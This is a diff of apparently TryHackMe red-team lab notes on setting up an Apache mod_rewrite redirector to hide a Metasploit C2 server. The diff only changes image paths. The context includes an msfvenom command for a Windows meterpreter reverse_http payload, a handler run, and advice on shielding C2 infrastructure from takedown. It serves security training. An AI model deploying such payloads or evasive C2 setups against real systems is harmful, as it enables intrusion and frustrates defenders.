@@ -10,13 +10,13 @@ Before we dive into configuring a Redirector, first, what is it? A Redirector i
 
 Jumping back into Metasploit, we can set up some basic configurations on Metasploit to allow for more advanced configurations, in this task; we will be setting up a Redirector. Usually, this configuration is set up on multiple hosts; the purpose of this is to hide the true Command and Control server. The diagram below illustrates how communications between a victim and a C2 server happen.
 
-![](./img/Pasted%20image%2020240125191424.png)
+![](Pasted%20image%2020240125191424.png)
 
 Usually, when you have a C2 callback, you may set the callback host to a Domain, let's say admin.tryhackme.com. It's very common for your C2 Server to get reported, when a user files a complaint. Usually, the server gets taken down fairly quickly. It can sometimes be as little as 3 hours and as much as 24. Setting up a redirector ensures that any information you may have collected during the engagement is safe and sound. 
 
 But how does this stop the C2 Server from being taken down? Surely if someone fingerprinted Cobalt Strike on your C2 Server, someone would file a complaint, and it would get taken down. This is true, so you should set up a Firewall to only allow communication to and from your redirector(s) to mitigate any potential risks.
 
-![](./img/Pasted%20image%2020240125191448.png)
+![](Pasted%20image%2020240125191448.png)
 
 **How is a Redirector Setup?**
 
@@ -51,7 +51,7 @@ $ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent
 
 After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the `HTTP` filter to only view HTTP requests. After it's started capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.
 
-![](./img/Pasted%20image%2020240125191700.png)
+![](Pasted%20image%2020240125191700.png)
 
 Now that we have a field we can control in the HTTP Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.
 
@@ -148,4 +148,4 @@ msf6 exploit(multi/handler) > run
 
 After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector! For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use **multiple** hosts and DNS records instead of IP Addresses.
 
-![](./img/Pasted%20image%2020240125191858.png)
+![](Pasted%20image%2020240125191858.png)
